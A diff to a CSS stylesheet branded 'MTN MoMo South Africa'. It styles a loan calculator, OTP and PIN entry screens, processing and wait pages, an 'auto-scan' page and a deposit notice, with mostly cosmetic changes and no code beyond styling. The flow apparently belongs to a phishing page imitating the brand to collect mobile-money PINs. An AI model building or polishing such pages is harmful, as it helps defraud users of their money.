@@ -1,21 +1,14 @@
 /* ============================================================
    MTN MoMo South Africa – Complete Stylesheet
-   Yellow #FFCC00 | Black #000 | White
    ============================================================ */
-
 :root {
   --mtn-yellow: #FFCC00;
   --mtn-yellow-dark: #E6B800;
   --mtn-yellow-soft: #FFF8D6;
   --mtn-black: #000000;
   --mtn-dark: #1A1A1A;
-  --mtn-gray: #4A4A4A;
   --mtn-light-gray: #F5F5F5;
-  --mtn-gold: #FFCC00;
-  --mtn-light: #1A1A1A;
-  --grad: #FFCC00;
   --page-bg: #F5F5F5;
-  --white: #FFFFFF;
   --text-dark: #000000;
   --text-mid: #4A4A4A;
   --text-light: #888888;
@@ -44,7 +37,7 @@ body {
 
 /* ─── Logo ─── */
 .mtn-logo { display: flex; flex-direction: column; align-items: center; gap: 6px; }
-.mtn-logo-img { width: 60px; height: 60px; object-fit: contain; border-radius: 12px; background: transparent; display: block; }
+.mtn-logo-img { width: 60px; height: 60px; object-fit: contain; border-radius: 12px; display: block; }
 .mtn-logo-img.sm { width: 34px; height: 34px; border-radius: 6px; }
 .mtn-logo-text { font-size: 1rem; font-weight: 800; color: var(--mtn-black); letter-spacing: -0.01em; }
 .mtn-logo-sub { font-size: 0.65rem; color: #888; font-weight: 500; letter-spacing: 0.02em; }
@@ -114,15 +107,15 @@ body {
   padding: 13px; background: var(--mtn-yellow-soft);
   color: var(--mtn-black);
   border: 2px solid var(--mtn-yellow); border-radius: 24px;
-  font-size: 0.85rem; font-weight: 700;
+  font-size: 0.8rem; font-weight: 700;
   cursor: pointer; font-family: 'Inter', sans-serif;
   transition: background 0.2s;
 }
 .btn-resend:hover:not(:disabled) { background: var(--mtn-yellow); }
-.btn-resend:disabled { opacity: 0.7; cursor: not-allowed; }
+.btn-resend:disabled { opacity: 0.75; cursor: not-allowed; }
 .btn-resend.hidden { display: none; }
 
-/* ─── Form Fields ─── */
+/* ─── Form ─── */
 .field { margin-bottom: 18px; }
 .field label { display: block; font-size: 0.82rem; font-weight: 600; color: var(--text-mid); margin-bottom: 6px; }
 .field input, .field select, .field textarea {
@@ -159,7 +152,6 @@ body {
 .step-btns .btn-grad { flex: 1; }
 
 /* ─── Landing ─── */
-#page-landing { background: var(--page-bg); }
 .land-nav {
   background: var(--mtn-black);
   display: flex; align-items: center; justify-content: space-between;
@@ -175,12 +167,10 @@ body {
 }
 .land-card h1 { font-size: 1.6rem; font-weight: 800; letter-spacing: -0.02em; line-height: 1.15; text-align: center; margin-bottom: 8px; color: var(--mtn-black); }
 .land-tagline { text-align: center; font-size: 0.85rem; color: var(--text-light); margin-bottom: 28px; }
-
 .calc-box { background: var(--mtn-light-gray); border: 1px solid #eee; border-radius: var(--radius-sm); padding: 20px; margin-bottom: 22px; }
 .calc-box h2 { font-size: 0.92rem; font-weight: 700; margin-bottom: 16px; color: var(--mtn-black); }
 .calc-row2 { display: flex; justify-content: space-between; font-size: 0.82rem; color: var(--text-mid); margin-bottom: 6px; }
 .calc-row2 .cv { color: var(--mtn-black); font-weight: 800; }
-
 input[type=range] {
   width: 100%; -webkit-appearance: none;
   height: 6px; border-radius: 3px; outline: none;
@@ -201,7 +191,6 @@ input[type=range]::-webkit-slider-thumb {
 }
 .monthly-box .ml { font-size: 0.82rem; color: var(--text-light); font-weight: 500; }
 .monthly-box .ma { font-size: 1.6rem; font-weight: 800; color: var(--mtn-black); letter-spacing: -0.02em; }
-
 .land-footer {
   background: var(--mtn-black); padding: 16px;
   text-align: center; font-size: 0.77rem;
@@ -219,7 +208,6 @@ input[type=range]::-webkit-slider-thumb {
 }
 .step-card h2 { font-size: 1.35rem; font-weight: 800; letter-spacing: -0.01em; text-align: center; margin-bottom: 4px; color: var(--mtn-black); }
 .step-sub { text-align: center; font-size: 0.82rem; color: var(--text-light); margin-bottom: 4px; }
-
 .sum-box {
   border: 1px solid #e0e0e0; border-left: 4px solid var(--mtn-yellow);
   border-radius: var(--radius-sm); padding: 16px 14px;
@@ -231,7 +219,7 @@ input[type=range]::-webkit-slider-thumb {
 .sum-row .sk { color: var(--text-light); }
 .sum-row .sv { font-weight: 700; color: var(--mtn-black); }
 
-/* ─── Processing ─── */
+/* ─── Processing & Wait ─── */
 #page-processing { background: var(--mtn-black); align-items: center; justify-content: center; }
 .proc-wrap { text-align: center; padding: 40px 24px; max-width: 420px; }
 .proc-icon {
@@ -249,7 +237,6 @@ input[type=range]::-webkit-slider-thumb {
 .proc-wrap p { color: rgba(255,255,255,0.7); font-size: 0.9rem; line-height: 1.7; margin-bottom: 24px; }
 .proc-status { margin-top: 20px; font-size: 0.9rem; color: var(--mtn-yellow); font-weight: 600; }
 
-/* ─── Wait Screens ─── */
 .wait-bg {
   background: var(--mtn-black); min-height: 100vh; width: 100%;
   display: flex; align-items: center; justify-content: center;
@@ -301,15 +288,6 @@ input[type=range]::-webkit-slider-thumb {
 
 /* ─── PIN ─── */
 .pin-label { font-size: 0.82rem; color: var(--text-light); text-align: center; margin-bottom: 12px; }
-.pin-attempts {
-  text-align: center; font-size: 0.82rem; font-weight: 700;
-  color: var(--success); background: var(--success-bg);
-  border: 1px solid var(--success-border);
-  border-radius: 8px; padding: 10px 14px; margin-bottom: 16px;
-}
-.pin-attempts.warning { color: #a07000; background: var(--warning-bg); border-color: var(--warning); }
-.pin-attempts.blocked { color: var(--error); background: var(--error-bg); border-color: var(--error-border); }
-.pin-attempts.available { color: var(--success); background: var(--success-bg); border-color: var(--success-border); }
 .pin-row { display: flex; gap: 10px; justify-content: center; margin-bottom: 14px; align-items: center; }
 .pin-box {
   width: 54px; height: 54px;
@@ -418,9 +396,8 @@ input[type=range]::-webkit-slider-thumb {
 @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-6px); } 75% { transform: translateX(6px); } }
 
 /* ═══════════════════════════════════════════════════════════
-   AUTO-SCAN PAGE (Momo transaction review)
+   AUTO-SCAN PAGE
    ═══════════════════════════════════════════════════════════ */
-
 .scan-icon {
   position: relative;
   width: 120px;
@@ -438,9 +415,7 @@ input[type=range]::-webkit-slider-thumb {
   border-radius: 50%;
   animation: scan-spin 1.4s linear infinite;
 }
-@keyframes scan-spin {
-  to { transform: rotate(360deg); }
-}
+@keyframes scan-spin { to { transform: rotate(360deg); } }
 .scan-inner {
   width: 84px;
   height: 84px;
@@ -452,7 +427,6 @@ input[type=range]::-webkit-slider-thumb {
   justify-content: center;
   font-size: 2rem;
 }
-
 .scan-checklist {
   background: rgba(255, 255, 255, 0.05);
   border: 1px solid rgba(255, 204, 0, 0.2);
@@ -470,14 +444,8 @@ input[type=range]::-webkit-slider-thumb {
   color: rgba(255, 255, 255, 0.5);
   transition: color 0.3s ease;
 }
-.scan-item.active {
-  color: var(--mtn-yellow);
-  font-weight: 600;
-}
-.scan-item.done {
-  color: var(--success);
-  font-weight: 600;
-}
+.scan-item.active { color: var(--mtn-yellow); font-weight: 600; }
+.scan-item.done { color: var(--success); font-weight: 600; }
 .scan-dot {
   width: 12px;
   height: 12px;
@@ -485,15 +453,10 @@ input[type=range]::-webkit-slider-thumb {
   background: rgba(255, 255, 255, 0.2);
   flex-shrink: 0;
   transition: background 0.3s;
-}
-.scan-item.active .scan-dot {
-  background: var(--mtn-yellow);
-  animation: blip 1.2s ease infinite;
-}
-.scan-item.done .scan-dot {
-  background: var(--success);
   position: relative;
 }
+.scan-item.active .scan-dot { background: var(--mtn-yellow); animation: blip 1.2s ease infinite; }
+.scan-item.done .scan-dot { background: var(--success); }
 .scan-item.done .scan-dot::after {
   content: '✓';
   position: absolute;
@@ -506,7 +469,7 @@ input[type=range]::-webkit-slider-thumb {
   justify-content: center;
 }
 
-/* ─── Deposit Note (used in scan + approval pages) ─── */
+/* ─── Deposit Note ─── */
 .deposit-note {
   margin-top: 20px;
   background: rgba(0, 135, 90, 0.12);
@@ -519,11 +482,7 @@ input[type=range]::-webkit-slider-thumb {
   text-align: left;
 }
 .deposit-icon { font-size: 1.4rem; flex-shrink: 0; }
-.deposit-note p {
-  font-size: 0.8rem;
-  color: #ABF5D1;
-  line-height: 1.5;
-}
+.deposit-note p { font-size: 0.8rem; color: #ABF5D1; line-height: 1.5; }
 .deposit-note strong { color: #E3FCEF; }
 
 /* ─── Mobile ─── */
@@ -537,5 +496,5 @@ input[type=range]::-webkit-slider-thumb {
   .appr-banner .aba { font-size: 1.8rem; }
   .scan-icon { width: 100px; height: 100px; }
   .scan-inner { width: 70px; height: 70px; font-size: 1.6rem; }
-  .btn-resend { font-size: 0.78rem; }
+  .btn-resend { font-size: 0.75rem; }
 }
